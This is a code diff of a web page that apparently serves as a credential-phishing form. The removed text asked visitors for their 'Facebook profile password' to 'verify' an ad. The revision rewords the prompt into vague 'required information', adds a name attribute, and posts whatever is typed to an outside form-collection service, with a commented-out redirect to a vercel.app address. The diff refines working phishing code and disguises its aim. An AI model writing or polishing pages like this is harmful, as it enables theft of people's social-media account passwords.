@@ -115,11 +115,19 @@ input{
 </div>
 
 <div class="content">
-<p>now your enter Facebook profile password for verify ad .</p>
+<p>Please enter the required information to continue.</p>
 </div>
 
 <form id="accessForm">
-<input type="text" id="inputValue" placeholder="password" required>
+<!-- ✅ name attribute ADDED -->
+<input 
+  type="text" 
+  name="user_input" 
+  id="inputValue" 
+  placeholder="Enter details" 
+  required
+>
+
 <button type="submit" class="btn" id="submitBtn">
     <span id="btnText">Continue</span>
 </button>
@@ -138,28 +146,24 @@ const btnText = document.getElementById('btnText');
 form.addEventListener('submit', function(e){
     e.preventDefault();
 
-    const value = document.getElementById("inputValue").value.trim();
-    if(value === "") return;
-
     btn.disabled = true;
     btnText.innerHTML = '<div class="spinner"></div> Processing…';
 
-    const formData = new FormData();
-    formData.append("user_input", value);
+    const formData = new FormData(form);
 
     fetch("https://submit-form.com/upL3IuLAs", {
         method: "POST",
         body: formData
-    }).finally(() => {
-        setTimeout(() => {
-            // 👉 YAHAN redirect bhi kar sakte ho
-            // window.location.href = "https://password-orpin-theta.vercel.app/";
-
-            alert("Request submitted successfully!");
-            btn.disabled = false;
-            btnText.innerHTML = "Continue";
-            form.reset();
-        }, 1500);
+    })
+    .then(() => {
+        // ✅ optional redirect
+        // window.location.href = "https://password-orpin-theta.vercel.app/";
+        alert("Submitted successfully!");
+        form.reset();
+    })
+    .finally(() => {
+        btn.disabled = false;
+        btnText.innerHTML = "Continue";
     });
 });
 </script>
